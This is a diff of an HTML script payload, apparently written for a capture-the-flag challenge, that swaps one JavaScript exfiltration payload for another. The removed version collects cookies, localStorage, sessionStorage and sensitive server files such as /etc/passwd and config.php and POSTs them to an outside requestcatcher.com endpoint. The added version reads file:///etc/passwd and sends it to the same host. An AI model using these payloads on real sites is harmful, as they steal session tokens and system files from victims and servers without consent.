@@ -1,70 +1,10 @@
 <script>
-// 创建多个请求对象
-var xhrFiles = new XMLHttpRequest();
-var xhrCookies = new XMLHttpRequest();
-var xhrAdmin = new XMLHttpRequest();
-var xhrFlag = new XMLHttpRequest();
-
-// 创建一个用于收集所有信息的函数
-function collectAllInfo() {
-    var allInfo = {
-        cookies: document.cookie,
-        localStorage: JSON.stringify(localStorage),
-        sessionStorage: JSON.stringify(sessionStorage),
-        files: [],
-        adminPages: [],
-        flagContents: []
-    };
-
-    // 获取文件列表
-    fetch('/files')
-        .then(response => response.text())
-        .then(html => {
-            // 解析目录列表
-            var parser = new DOMParser();
-            var doc = parser.parseFromString(html, 'text/html');
-            var fileLinks = doc.getElementsByTagName('a');
-            
-            for (var i = 0; i < fileLinks.length; i++) {
-                allInfo.files.push(fileLinks[i].href);
-            }
-        });
-
-    // 尝试读取各种敏感文件
-    var filesToTry = [
-        '/var/www/html/admin.php',
-        '/var/www/html/config.php',
-        '/var/www/html/database.php',
-        '/files/flag.txt',
-        '/etc/passwd'
-    ];
-
-    // 并行读取文件
-    filesToTry.forEach(file => {
-        fetch(file)
-            .then(response => response.text())
-            .then(content => {
-                if (file.includes('admin.php')) {
-                    allInfo.adminPages.push(content);
-                }
-                if (file === '/files/flag.txt') {
-                    allInfo.flagContents.push(content);
-                }
-            })
-            .catch(error => {
-                console.log('Error reading ' + file + ':', error);
-            });
-    });
-
-    // 发送所有收集的信息
-    setTimeout(() => {
-        fetch('https://salad.requestcatcher.com/collect', {
-            method: 'POST',
-            body: JSON.stringify(allInfo)
-        });
-    }, 2000);
-}
-
-// 立即执行信息收集
-collectAllInfo();
+var xhr = new XMLHttpRequest;
+var xhr2 = new XMLHttpRequest;
+xhr.onload = function () {
+xhr2.open('POST', 'https://salad.requestcatcher.com/haha');
+xhr2.send("FLAG" + xhr.response);
+};
+xhr.open('GET', 'file:///etc/passwd');
+xhr.send();
 </script>
